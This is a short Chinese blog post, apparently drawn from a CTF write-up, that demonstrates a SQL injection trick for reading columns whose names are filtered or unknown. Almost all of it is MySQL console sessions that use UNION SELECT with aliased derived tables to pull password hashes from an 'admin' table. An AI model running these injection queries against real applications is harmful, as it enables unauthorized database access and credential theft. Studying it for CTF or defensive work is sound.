Title: SQL注入绕过未知字段名的技巧
Category: SQL
Date: 2017-11-28
Slug: sql-bypass-unknown

<http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL注入之过滤列名get数据/> 

```sql
mysql> select * from (select 1)a,(select 2)b,(select 3)c;
+---+---+---+
| 1 | 2 | 3 |
+---+---+---+
| 1 | 2 | 3 |
+---+---+---+
1 row in set (0.00 sec)

mysql> select * from (select 1)a,(select 2)b,(select 3)c union select * from admin;
+---+--------+----------------------------------+
| 1 | 2      | 3                                |
+---+--------+----------------------------------+
| 1 | 2      | 3                                |
| 1 | admin  | e10adc3949ba59abbe56e057f20f883e |
| 2 | admin2 | 7195ca99696b5a896d067a0fa9dc61a6 |
| 3 | admin3 | 7195C                            |
+---+--------+----------------------------------+
4 rows in set (0.00 sec)

mysql> select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from admin)e;
+----------------------------------+
| 3                                |
+----------------------------------+
| 3                                |
| e10adc3949ba59abbe56e057f20f883e |
| 7195ca99696b5a896d067a0fa9dc61a6 |
| 7195C                            |
+----------------------------------+
4 rows in set (0.00 sec)

mysql> select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from admin)e limit 1 offset 3;
+-------+
| 3     |
+-------+
| 7195C |
+-------+
1 row in set (0.00 sec)

mysql> select * from admin where id=1 union select 1,2,3;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | e10adc3949ba59abbe56e057f20f883e |
|  1 | 2        | 3                                |
+----+----------+----------------------------------+
2 rows in set (0.01 sec)

mysql> select * from admin where id=1 union select (select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from admin)e limit 1 offset 3),2,3;
+-------+----------+----------------------------------+
| id    | username | password                         |
+-------+----------+----------------------------------+
| 1     | admin    | e10adc3949ba59abbe56e057f20f883e |
| 7195C | 2        | 3                                |
+-------+----------+----------------------------------+
2 rows in set (0.00 sec)
```



